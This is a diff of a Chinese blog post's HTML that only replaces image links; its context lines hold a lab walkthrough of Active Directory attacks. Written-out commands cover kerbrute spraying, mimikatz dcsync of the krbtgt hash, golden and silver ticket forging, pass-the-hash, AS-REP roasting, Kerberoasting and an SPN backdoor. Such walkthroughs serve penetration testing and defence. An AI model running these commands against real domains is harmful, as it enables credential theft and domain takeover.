@@ -228,8 +228,8 @@
 <p><code>https://github.com/ropnop/kerbrute/release</code><br>
 枚举用户</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域外</span><br><span class="line">kerbrute_windows_amd64.exe userenum --dc <span class="number">192.168</span><span class="number">.40</span><span class="number">.132</span> -d spanning-tree user.txt</span><br><span class="line"></span><br><span class="line">域内(在域内可不指定dc ip)</span><br><span class="line">kerbrute_windows_amd64.exe userenum -d spanning-tree.org user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aa95vgz7j20qo09d0vd.jpg" alt="image.png"><br>
-<img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aa9903t7j20mg0b6wg8.jpg" alt="image.png"><br>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271002655.jpg" alt="image.png"><br>
+<img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271004711.jpg" alt="image.png"><br>
 <strong>kerbrute 密码喷洒</strong><br>
 默认情况下域用户不锁定的，锁定策略需要手动开启。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum  -d spanning-tree.org user.txt <span class="number">123456</span></span><br></pre></td></tr></table></figure>
@@ -241,7 +241,7 @@
 <p><strong>pykerbrute 密码喷洒</strong><br>
 该工具可以针对mtlnhash进行密码喷洒</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ADPwdSpray.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> spanning-tree.org user.txt clearpassword DomainUser123! tcp</span><br><span class="line"></span><br><span class="line">ADPwdSpray.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> spanning-tree.org user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aaaacq9tj20tt08bdij.jpg" alt="image.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271004009.jpg" alt="image.png"></p>
 <h2 id="0x02-哈希传递">0x02 哈希传递</h2>
 <h3 id="原理分析">原理分析</h3>
 <p>在kerberos认证过程中用户的认证信息是使用用户的hash进行加密后发送的，当AS接收到用户的凭证时候，AS存有用户的hash可以解密。<br>
@@ -253,7 +253,7 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">mimikatz # sekurlsa::pth /user:zhangsan /domain:spanning-tree.org /ntlm:594ba03f9dd6874f8cee671c26e31a2a</span><br></pre></td></tr></table></figure>
 <h4 id="impacket">impacket</h4>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py spanning-tree.org/administrator@<span class="number">192.168</span><span class="number">.40</span><span class="number">.132</span> -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">85</span>a99f6f97db22fe110bfb0961b2d805</span><br><span class="line">等</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aaa65u6ej21go05fac8.jpg" alt="image.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271004194.jpg" alt="image.png"></p>
 <h2 id="0x03-黄金票据">0x03 黄金票据</h2>
 <h3 id="原理分析">原理分析</h3>
 <p><strong>在Kerberos认证的AS_REQ阶段，用户认证成功后会返回TGT票据；TGT票据的签发是通过krbtgt hash进行加密。当我们获取到krbtgt用户的hash时就可以任意的签发TGT票据，并且在伪造的20分钟内不会校验真伪。</strong></p>
@@ -261,24 +261,24 @@
 <h4 id="mimikatz">mimikatz</h4>
 <p>导出krbtgt用户hash</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:spanning-tree.org /user:krbtgt</span><br><span class="line"></span><br><span class="line">SID：S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span><span class="number">-502</span></span><br><span class="line"></span><br><span class="line">Hash NTLM: <span class="number">257161</span>ba130cf9f543509f4f14f25f40</span><br><span class="line">aes256_hmac：b6edb81920356c9e165b7844ea5152be8153fad6e2b9b3b6a17aac1af14b0457</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aaaieh7rj20m60m1wh3.jpg" alt="image.png"><br>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271004708.jpg" alt="image.png"><br>
 生成黄金票据</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:spanning-tree.org /admin:administrator /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span> /krbtgt:<span class="number">257161</span>ba130cf9f543509f4f14f25f40 /ticket:administrator.kiribi</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aaarssxkj216c09it9y.jpg" alt="image.png"><br>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271004538.jpg" alt="image.png"><br>
 将票据注入内存中</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aaavel9aj20kx08gwfm.jpg" alt="image.png"><br>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271004442.jpg" alt="image.png"><br>
 在域外如果要对域控进行攻击需要将DNS指向域内DNS服务器，且注入的令牌只在管理员权限下才能调用。<br>
-<img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aab0rbh6j20zz0didjn.jpg" alt="image.png"><br>
-<img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aab767p9j20mk0ibgpu.jpg" alt="image.png"></p>
+<img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271004850.jpg" alt="image.png"><br>
+<img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271004202.jpg" alt="image.png"></p>
 <h4 id="impacket">impacket</h4>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ticket.py -nthash <span class="number">257161</span>ba130cf9f543509f4f14f25f40 -domain-sid S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span> -domain spanning-tree.org administrator</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aabde2mxj21gt099tbv.jpg" alt="image.png"><br>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271005975.jpg" alt="image.png"><br>
 设置环境变量</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">set KRB5CCNAME=C:\Users\Administrator\Desktop\impacket<span class="number">-0.9</span><span class="number">.24</span>\\examples\\administrator.ccache</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line"><span class="keyword">export</span> KRB5CCNAME=<span class="regexp">/home/u</span>ser/ticket.ccache</span><br><span class="line">cat $KRB5CCNAME</span><br></pre></td></tr></table></figure>
 <p>检测是否成功</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py spanning-tree.org/administrator@WIN-SJD97LJQLJP -k -no-pass</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aabjz3dmj216z07gach.jpg" alt="image.png"><br>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271005006.jpg" alt="image.png"><br>
 利用impacket工具包生成的黄金票据无法通过net use建立IPC连接但是可以通过impacket系列工具执行命令，其hostname名称可以通过ping -a IP进行解析。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx.py domain/username@hostname -k -no-pass</span><br></pre></td></tr></table></figure>
 <h2 id="0x04-as-roasting">0x04 AS-Roasting</h2>
@@ -288,7 +288,7 @@
 <h3 id="攻击方法">攻击方法</h3>
 <p>使用Rubeus自动查找所有不需要预身份验证的帐户，并提取脱机破解所需的加密 TGT 数据。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /format:hashcat /outfile:C:\Users\lisi\Desktop\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aabqdol8j20pm0bg0tz.jpg" alt="image.png"><br>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271005937.jpg" alt="image.png"><br>
 随后使用针对保存的hash进行离线破解即可。</p>
 <h2 id="0x05-白银票据">0x05 白银票据</h2>
 <h3 id="原理分析">原理分析</h3>
@@ -298,13 +298,13 @@
 <p>使用白银票据伪造LDAP服务权限<br>
 获取服务账号的NTLM哈希</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line">NTLM: <span class="number">325</span>b92ac27746315a7caf8fba0b71c3f</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aabtqqfuj20m30jk42c.jpg" alt="image.png"><br>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271005283.jpg" alt="image.png"><br>
 当前权限无法使用dcsync与域控进行同步</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:WIN-SJD97LJQLJP.spanning-tree.org /domain:spanning-tree.org /user:krbtgt</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aabztdekj20pz03ht9p.jpg" alt="image.png"><br>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271005003.jpg" alt="image.png"><br>
 伪造白银票据获取LDAP访问权限</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:spanning-tree.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span> /target:WIN-SJD97LJQLJP.spanning-tree.org /service:LDAP /rc4:<span class="number">325</span>b92ac27746315a7caf8fba0b71c3f /user:Administrator /ptt</span><br></pre></td></tr></table></figure>
-<p><img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aac4j8oxj20q40qs0z4.jpg" alt="image.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271005377.jpg" alt="image.png"></p>
 <h4 id="impacket">impacket</h4>
 <p>伪造白银票据获取LDAP权限</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ticketer.py -nthash <span class="number">325</span>b92ac27746315a7caf8fba0b71c3f -domain-sid S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span> -domain spanning-tree.org -dc WIN-SJD97LJQLJP.spanning-tree.org -spn ldap/WIN-SJD97LJQLJP.spanning-tree.org silver</span><br></pre></td></tr></table></figure>
@@ -313,14 +313,14 @@
 <p>出现该攻击因为TGS_REQ阶段用户发送TGT票据，服务不管是否有权限均返回ST票据；ST票据是由服务的hash进行加密，所以可以针对ST票据的哈希进行破解进而获取服务的明文密码。</p>
 <h3 id="攻击方法">攻击方法</h3>
 <p>使用Rubeus去寻找高权限的域账户，并未发现。<br>
-<img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aac971xrj20lr0bcjsn.jpg" alt="image.png"><br>
+<img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271005499.jpg" alt="image.png"><br>
 这里手动给域账户添加SPN服务（需要域管权限)，可用作后门。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A VNC/DESKTOP-FQBK8L8.spanning-tree.org lisi</span><br></pre></td></tr></table></figure>
 <p>我们再次使用Rubeus可发现lisi域账户注册SPN服务<br>
-<img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aaccfgjtj20o6047js6.jpg" alt="image.png"></p>
+<img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271005303.jpg" alt="image.png"></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /format:hashcat /outfile:C:\Users\administrator\Desktop\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
 <p>获取其ST票据后，可使用hastcat进行加密。针对高权限账户可注册SPN服务，这样我们就可以随时获取该用户的ST票据进行破解。<br>
-<img src="https://gimg2.baidu.com/image_search/&amp;app=2020&amp;src=tva1.sinaimg.cn/large/e6c9d24egy1h2aacg3y84j20uv0jtn36.jpg" alt="image.png"></p>
+<img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303271006035.jpg" alt="image.png"></p>
 
                 
 
